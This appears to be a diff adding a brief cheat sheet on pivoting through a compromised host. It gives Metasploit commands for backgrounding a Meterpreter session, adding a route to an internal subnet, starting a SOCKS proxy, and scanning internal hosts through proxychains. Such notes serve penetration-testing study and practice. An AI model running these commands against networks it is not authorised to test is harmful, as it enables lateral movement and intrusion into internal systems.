@@ -1,0 +1,23 @@
+✅ Purpose
+
+Route traffic through Meterpreter session
+
+⚙️ Step 1: Background Session
+
+background
+
+⚙️ Step 2: Add Route
+
+run autoroute -s 192.168.1.0/24
+
+🔍 Explanation
+Adds route via compromised host
+⚙️ Step 3: Start SOCKS Proxy
+
+use auxiliary/server/socks_proxy
+set SRVPORT 1080
+run
+
+⚙️ Step 4: Use Proxychains
+
+proxychains nmap -sT 192.168.1.10
